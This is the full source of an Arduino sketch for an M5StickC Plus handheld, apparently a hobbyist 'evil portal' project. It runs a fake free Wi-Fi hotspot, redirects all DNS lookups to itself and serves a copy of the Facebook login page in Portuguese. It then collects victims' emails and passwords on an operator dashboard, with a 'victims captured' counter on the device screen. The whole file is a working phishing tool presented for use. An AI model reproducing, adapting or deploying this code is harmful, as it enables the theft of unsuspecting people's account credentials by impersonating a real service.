#include <M5StickCPlus.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
 
 
// Based on https://community.dfrobot.com/makelog-313463.html
// Modified font and text placement for StickC-Plus, further improvements added
// Code BY: https://github.com/n0xa/
// Moded BY: https://github.com/Kuush01
// Moded BY: https://github.com/raphntc

 
// User configuration
#define SSID_NAME "Wi-Fi Gratis"
#define SUBTITLE "E-CORP service."
#define POST_TITLE "Validando Acesso..."
#define POST_BODY "Sua conta esta sendo validada. Aguarde ate 5 minutos pela conexao do dispositivo.</br>Obrigado."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"

int capcount = 0;           // lifetime captures (shown on the LCD)
int storedCount = 0;        // entries currently in memory (reset by /clear)
int previous = -1;          // last count drawn on screen; -1 forces the first redraw
const int BUILTIN_LED = 10; // M5StickC Plus internal LED (active LOW)

// Non-blocking LED blink state (armed when a capture arrives)
int blinkRemaining = 0;                    // LED toggles left to perform
unsigned long lastBlink = 0;               // millis() of last toggle
const unsigned long BLINK_INTERVAL = 150;  // ms between toggles

// LCD theme (RGB565) + live status-dot state
#define RGB565(r, g, b) ((uint16_t)(((r & 0xF8) << 8) | ((g & 0xFC) << 3) | ((b) >> 3)))
#define C_BG      RGB565(15, 17, 21)     // background
#define C_ACCENT  RGB565(24, 119, 242)   // header bar (blue)
#define C_ACCENT2 RGB565(120, 170, 255)  // gateway value (light blue)
#define C_OK      RGB565(48, 163, 108)   // "active" dot
#define C_OKDIM   RGB565(22, 60, 42)     // "active" dot, off phase
#define C_MUTED   RGB565(138, 147, 166)  // labels
#define C_CARD    RGB565(26, 29, 36)     // counter card
#define C_COUNT   RGB565(255, 196, 0)    // victim count (amber)
bool dotOn = false;
 
// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway
 
String Credentials = "";
unsigned long lastTick = 0;
DNSServer dnsServer; WebServer webServer(80);
 
String input(String argName) {
  String a = webServer.arg(argName);
  a = a.substring(0, 200);  // actually limit length (substring returns a copy)
  a.replace("&", "&amp;");  // escape & first so later entities aren't double-escaped
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.replace("\"", "&quot;");
  return a;
}

// Format a millis() value as H:MM:SS (used for "captured at" and uptime).
String fmtUptime(unsigned long ms) {
  unsigned long s = ms / 1000;
  char buf[16];
  snprintf(buf, sizeof(buf), "%lu:%02lu:%02lu", s / 3600, (s % 3600) / 60, s % 60);
  return String(buf);
}

String footer() {
  return
    "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}
 
String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}
 
// Operator dashboard served at /creds. Self-contained dark-theme page:
// stat tiles, a table of captures (newest first), and action buttons.
String creds() {
  String css =
    ":root{--bg:#0f1115;--card:#171a21;--line:#262b36;--txt:#e6e9ef;--mut:#8a93a6;--accent:#4169e1;--danger:#e5484d}"
    "*{box-sizing:border-box}"
    "body{margin:0;background:var(--bg);color:var(--txt);font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;line-height:1.5}"
    ".top{background:linear-gradient(90deg,#1b2a6b,#4169e1);padding:18px 20px}"
    ".top h1{margin:0;font-size:20px;letter-spacing:.3px}"
    ".top p{margin:3px 0 0;color:#cdd6ff;font-size:13px}"
    ".wrap{max-width:900px;margin:0 auto;padding:16px}"
    ".stats{display:flex;gap:12px;flex-wrap:wrap;margin:16px 0}"
    ".tile{flex:1;min-width:140px;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px 16px}"
    ".tile .k{color:var(--mut);font-size:12px;text-transform:uppercase;letter-spacing:.5px}"
    ".tile .v{font-size:26px;font-weight:700;margin-top:4px}"
    ".tile .v.accent{color:#8ab0ff}"
    ".bar{display:flex;gap:10px;flex-wrap:wrap;margin:8px 0 16px}"
    ".btn{display:inline-block;padding:9px 14px;border-radius:10px;border:1px solid var(--line);background:var(--card);color:var(--txt);text-decoration:none;font-size:14px;cursor:pointer}"
    ".btn:hover{border-color:var(--accent)}"
    ".btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}"
    ".btn.danger{background:transparent;border-color:var(--danger);color:#ff9a9d}"
    ".btn.danger:hover{background:var(--danger);color:#fff}"
    "table{width:100%;border-collapse:collapse;background:var(--card);border:1px solid var(--line);border-radius:12px;overflow:hidden}"
    "thead th{background:#10131a;color:var(--mut);text-align:left;font-size:12px;text-transform:uppercase;letter-spacing:.5px;padding:10px 12px;border-bottom:1px solid var(--line)}"
    "tbody td{padding:11px 12px;border-bottom:1px solid var(--line);vertical-align:top;word-break:break-word}"
    "tbody tr:last-child td{border-bottom:none}"
    "tbody tr:nth-child(even){background:rgba(255,255,255,.02)}"
    ".idx{color:var(--mut);width:42px}"
    ".pass code{background:#0c0f14;border:1px solid var(--line);border-radius:6px;padding:2px 6px;color:#7ee2b8;font-family:ui-monospace,Menlo,Consolas,monospace}"
    ".time{color:var(--mut);white-space:nowrap}"
    ".empty{background:var(--card);border:1px dashed var(--line);border-radius:12px;padding:44px 20px;text-align:center;color:var(--mut)}"
    ".note{color:var(--mut);font-size:12px;margin:14px 0 30px;text-align:center}";

  String body;
  if (storedCount == 0) {
    body = "<div class=\"empty\">No credentials captured yet.<br>They will appear here as devices submit the portal form.</div>";
  } else {
    body = "<table><thead><tr><th class=\"idx\">#</th><th>Email</th><th>Password</th><th class=\"time\">Captured (uptime)</th></tr></thead><tbody>"
           + Credentials + "</tbody></table>";
  }

  return
    "<!DOCTYPE html><html lang=\"en\"><head>"
    "<meta charset=\"UTF-8\">"
    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
    "<meta http-equiv=\"refresh\" content=\"15\">"
    "<title>" + String(SSID_NAME) + " :: " + PASS_TITLE + "</title>"
    "<style>" + css + "</style></head><body>"
    "<div class=\"top\"><h1>Portal Evil HUEBR</h1><p>Captured credentials dashboard</p></div>"
    "<div class=\"wrap\">"
    "<div class=\"stats\">"
    "<div class=\"tile\"><div class=\"k\">Stored entries</div><div class=\"v accent\">" + String(storedCount) + "</div></div>"
    "<div class=\"tile\"><div class=\"k\">Total captures</div><div class=\"v\">" + String(capcount) + "</div></div>"
    "<div class=\"tile\"><div class=\"k\">Uptime</div><div class=\"v\">" + fmtUptime(millis()) + "</div></div>"
    "</div>"
    "<div class=\"bar\">"
    "<a class=\"btn primary\" href=\"/creds\">&#8635; Refresh</a>"
    "<a class=\"btn danger\" href=\"/clear\" onclick=\"return confirm('Clear all captured credentials? This cannot be undone.')\">Clear all</a>"
    "<a class=\"btn\" href=\"/\">Back to portal</a>"
    "</div>"
    + body +
    "<p class=\"note\">Data is stored in RAM only and is lost on reboot. This page auto-refreshes every 15 s.</p>"
    "</div></body></html>";
}
 
String index() {
  String htmlContent = "<!DOCTYPE html><html lang=\"pt-br\"><head>"
    "<meta charset=\"UTF-8\">"
    "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">"
    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
    "<style>"
    "@charset \"utf-8\";"
    "* {box-sizing: border-box;text-decoration: none;}"
    "body {display: flex;flex-direction: row;justify-content: center;align-items: center;margin-top: 40px;font-family: Helvetica, sans-serif;background: #F3F2F2;}"
    "div#corpo h1 {text-align: center;color: #4169e1;font-size: 50px;}"
    "div#login {border-radius: 6px;width: 350px;box-shadow: 0 2px 4px rgba(0 ,0 ,0 ,0.3), 0 8px 16px rgba(0 ,0 ,0 ,0.3);}"
    "div#login form {width: 100px 100px;padding: 16px;background-color: white;border-radius: 8px;}"
    "div#login a {padding-left: 80px;margin-top: 16px;display: block;}"
    "div#login p {text-align: center;font-size: 16px;margin-top: 5px;}"
    "div#login input {width: 100%;margin-bottom: 10px;padding: 16px;border-radius: 6px;border: 1px solid #c3c5c9;}"
    "div#login input[placeholder] {font-size: 16px;opacity: 50%;}"
    "div#login button {background-color: #4169e1;border-radius: 8px;border: 1px solid white;width: 100%;padding: 15px;color: white;font-family: Helvetica, sans-serif;font-size: 16px;font-weight: bold;cursor: pointer;}"
    "</style>"
    "<link rel=\"shortcut icon\" href=\"favicon.ico\" type=\"image/x-icon\">"
    "<title>Facebook</title>"
    "</head>"
    "<body>"
    "<div id=\"corpo\">"
    "<h1>facebook</h1>"
    "<div id=\"login\">"
    "<form name=\"login-form\" method=\"POST\" action=\"/post\">"
    "<p>Entrar no Facebook</p>"
    "<input type=\"email\" autocomplete=\"email\" name=\"email\" id=\"email\" placeholder=\"Email ou telefone\" required>"
    "<input type=\"password\" name=\"password\" id=\"password\" placeholder=\"Senha\" required>"
    "<button type=\"submit\" name=\"submit\" id=\"submit\">Entrar</button>"
    "<a href=\"#\">Esqueceu a senha?</a>"
    "</form>"
    "</div>"
    "</div>"
    "</body>"
    "</html>";
 
  return htmlContent;
}
 
// Standalone "please wait / validating" page shown after a submission.
// Pure CSS/JS (device is offline): animated Wi-Fi icon, indeterminate progress
// bar, spinner and a live countdown. Text comes from POST_TITLE / POST_BODY.
String waiting() {
  return
    "<!DOCTYPE html><html lang=\"pt-br\"><head>"
    "<meta charset=\"UTF-8\">"
    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
    "<title>" + String(POST_TITLE) + "</title>"
    "<style>"
    "*{box-sizing:border-box;margin:0;padding:0}"
    "body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(160deg,#eef3fb,#dce7f7);font-family:Helvetica,Arial,sans-serif;color:#1c1e21;padding:20px}"
    ".card{background:#fff;width:100%;max-width:380px;border-radius:18px;padding:34px 28px;text-align:center;box-shadow:0 10px 30px rgba(24,119,242,.15),0 2px 8px rgba(0,0,0,.06)}"
    ".wifi{width:76px;height:76px;margin:0 auto 18px}"
    ".wifi svg{width:100%;height:100%}"
    ".a{fill:none;stroke:#1877f2;stroke-width:6;stroke-linecap:round;opacity:.2;animation:pulse 1.8s infinite}"
    ".a2{animation-delay:.2s}.a3{animation-delay:.4s}"
    ".dot{fill:#1877f2}"
    "@keyframes pulse{0%,100%{opacity:.2}40%{opacity:1}}"
    "h1{font-size:22px;color:#1877f2;margin-bottom:10px;font-weight:700}"
    ".msg{font-size:15px;color:#606770;line-height:1.5;margin-bottom:22px}"
    ".track{height:8px;background:#e8edf3;border-radius:99px;overflow:hidden;margin-bottom:18px}"
    ".track i{display:block;height:100%;width:40%;border-radius:99px;background:linear-gradient(90deg,#1877f2,#4fa3ff);animation:slide 1.4s ease-in-out infinite}"
    "@keyframes slide{0%{margin-left:-45%}100%{margin-left:105%}}"
    ".status{display:flex;align-items:center;justify-content:center;gap:8px;font-size:13px;color:#8a8d91}"
    ".spin{width:14px;height:14px;border:2px solid #cdd3dc;border-top-color:#1877f2;border-radius:50%;animation:spin .8s linear infinite}"
    "@keyframes spin{to{transform:rotate(360deg)}}"
    ".foot{margin-top:20px;font-size:12px;color:#b0b3b8}"
    "@media(prefers-reduced-motion){.a,.track i,.spin{animation:none}.a{opacity:.75}}"
    "</style></head><body>"
    "<div class=\"card\">"
    "<div class=\"wifi\"><svg viewBox=\"0 0 100 100\">"
    "<path class=\"a a3\" d=\"M15,45 A48,48 0 0 1 85,45\"/>"
    "<path class=\"a a2\" d=\"M27,56 A33,33 0 0 1 73,56\"/>"
    "<path class=\"a\" d=\"M38,66 A19,19 0 0 1 62,66\"/>"
    "<circle class=\"dot\" cx=\"50\" cy=\"74\" r=\"5\"/>"
    "</svg></div>"
    "<h1>" + String(POST_TITLE) + "</h1>"
    "<p class=\"msg\">" + String(POST_BODY) + "</p>"
    "<div class=\"track\"><i></i></div>"
    "<div class=\"status\"><span class=\"spin\"></span>Tempo estimado: <span id=\"t\">5:00</span></div>"
    "<div class=\"foot\">&#128274; Conex&atilde;o segura</div>"
    "</div>"
    "<script>var s=300,el=document.getElementById('t');setInterval(function(){if(s>0)s--;var m=(s/60)|0,x=s%60;el.textContent=m+':'+(x<10?'0'+x:x);},1000);</script>"
    "</body></html>";
}

String posted() {
  String email = input("email");
  String password = input("password");
  // Newest capture first; one table row per entry (rendered by creds()).
  String row = "<tr><td class=\"idx\">" + String(storedCount) + "</td>"
               "<td>" + email + "</td>"
               "<td class=\"pass\"><code>" + password + "</code></td>"
               "<td class=\"time\">" + fmtUptime(millis()) + "</td></tr>";
  Credentials = row + Credentials;
  return waiting();
}
 
String clear() {
  Credentials = "";
  storedCount = 0;
  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to dashboard</a></center>" + footer();
}
 
// Arm a non-blocking blink: 5 on/off cycles = 10 toggles.
// The toggling itself happens in updateBlink() from loop(), so DNS/HTTP keep serving.
void startBlink() {
  blinkRemaining = 10;
  lastBlink = millis();
  digitalWrite(BUILTIN_LED, LOW); // LED on (active LOW)
}

void updateBlink() {
  if (blinkRemaining > 0 && (millis() - lastBlink) > BLINK_INTERVAL) {
    lastBlink = millis();
    blinkRemaining--;
    // even remaining -> LED off, odd -> LED on
    digitalWrite(BUILTIN_LED, (blinkRemaining % 2 == 0) ? HIGH : LOW);
    if (blinkRemaining == 0) digitalWrite(BUILTIN_LED, HIGH); // make sure it ends off
  }
}

// -------- LCD UI (240x135, rotation 3) --------

// Small "AP active" dot in the top-right of the header bar.
void drawStatusDot(bool on) {
  M5.Lcd.fillCircle(228, 13, 5, on ? C_OK : C_OKDIM);
}

// Animated boot splash: wordmark + a progress bar that fills once.
void bootScreen() {
  M5.Lcd.fillScreen(C_BG);

  M5.Lcd.setTextDatum(MC_DATUM);
  M5.Lcd.setTextSize(3);
  M5.Lcd.setTextColor(C_ACCENT2, C_BG);
  M5.Lcd.drawString("PORTAL", 120, 36);
  M5.Lcd.setTextColor(TFT_WHITE, C_BG);
  M5.Lcd.drawString("EVIL", 120, 66);

  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.drawString("HUEBR  -  initializing", 120, 92);

  const int bx = 30, by = 108, bw = 180, bh = 12;
  M5.Lcd.drawRoundRect(bx, by, bw, bh, 4, C_MUTED);
  for (int p = 0; p <= 100; p += 2) {
    int w = (bw - 6) * p / 100;
    M5.Lcd.fillRoundRect(bx + 3, by + 3, w, bh - 6, 2, C_ACCENT);
    delay(18);
  }
  delay(200);
}

// Full dashboard repaint: header, SSID, gateway, and the victim-count card.
void drawMainScreen() {
  M5.Lcd.fillScreen(C_BG);

  // Header bar
  M5.Lcd.fillRect(0, 0, 240, 26, C_ACCENT);
  M5.Lcd.setTextDatum(MC_DATUM);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE, C_ACCENT);
  M5.Lcd.drawString("PORTAL EVIL HUEBR", 112, 13);
  drawStatusDot(true);

  // SSID
  M5.Lcd.setTextDatum(TL_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.drawString("SSID", 8, 32);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE, C_BG);
  M5.Lcd.drawString(SSID_NAME, 8, 42);

  // Gateway
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.drawString("GATEWAY", 8, 62);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(C_ACCENT2, C_BG);
  M5.Lcd.drawString(APIP.toString(), 8, 72);

  // Victim-count card
  M5.Lcd.fillRoundRect(3, 92, 234, 40, 8, C_CARD);
  M5.Lcd.setTextDatum(ML_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_CARD);
  M5.Lcd.drawString("VICTIMS CAPTURED", 14, 112);
  M5.Lcd.setTextDatum(MR_DATUM);
  M5.Lcd.setTextSize(4);
  M5.Lcd.setTextColor(C_COUNT, C_CARD);
  M5.Lcd.drawString(String(capcount), 226, 111);
}

void setup() {
  M5.begin();
  M5.Lcd.setRotation(3);

  bootScreen();  // animated splash while things come up

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
 
  webServer.on("/post", []() {
    capcount++;
    storedCount++;
    webServer.send(HTTP_CODE, "text/html", posted());
    M5.Beep.tone(4000);
    delay(50);
    M5.Beep.mute();
    startBlink();  // non-blocking; loop() redraws the stats screen with the new count
  });
 
  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([]() {
    webServer.send(HTTP_CODE, "text/html", index());
  });
  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);

  drawMainScreen();     // show the dashboard once the AP is up
  previous = capcount;  // avoid an immediate redraw on the first loop tick
  dotOn = true;
}
 
void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
    if (capcount != previous) {
      previous = capcount;
      drawMainScreen();   // full repaint with the new count
      dotOn = true;
    } else {
      dotOn = !dotOn;     // idle heartbeat: blink the "active" dot
      drawStatusDot(dotOn);
    }
  }
  updateBlink();
  dnsServer.processNextRequest(); webServer.handleClient();
}